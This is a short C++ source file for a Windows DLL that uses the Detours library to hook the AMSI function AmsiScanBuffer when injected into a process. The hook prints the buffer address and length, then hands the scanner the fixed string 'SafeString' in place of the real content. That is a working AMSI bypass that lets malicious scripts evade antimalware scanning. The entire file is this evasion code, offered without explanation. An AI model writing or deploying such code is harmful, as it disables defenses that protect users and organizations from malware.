#include <Windows.h>
#include <detours.h>
#include <amsi.h>
#include <iostream>
#pragma comment(lib, "amsi.lib")

#define SAFE "SafeString"

static HRESULT(WINAPI* OriginalAmsiScanBuffer)(HAMSICONTEXT amsiContext,
    PVOID buffer, ULONG length,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT* result) = AmsiScanBuffer;

//Our user controlled AmsiScanBuffer
__declspec(dllexport) HRESULT _AmsiScanBuffer(HAMSICONTEXT amsiContext,
    PVOID buffer, ULONG length,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT* result) {

    std::cout << "[+] AmsiScanBuffer called" << std::endl;
    std::cout << "[+] Buffer " << buffer << std::endl;
    std::cout << "[+] Buffer Length " << length << std::endl;
    return OriginalAmsiScanBuffer(amsiContext, (BYTE*)SAFE, length, contentName, amsiSession, result);
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  dwReason,
    LPVOID lpReserved
)
{
    if (DetourIsHelperProcess()) {
        return TRUE;
    }

    if (dwReason == DLL_PROCESS_ATTACH) {
        AllocConsole();
        freopen_s((FILE**)stdout, "CONOUT$", "w", stdout);

        DetourRestoreAfterWith();
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());

        DetourAttach(&(PVOID&)OriginalAmsiScanBuffer, _AmsiScanBuffer);
        DetourTransactionCommit();

    } else if (dwReason == DLL_PROCESS_DETACH) {
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)OriginalAmsiScanBuffer, _AmsiScanBuffer);
        DetourTransactionCommit();
        FreeConsole();
    }
    return TRUE;
}
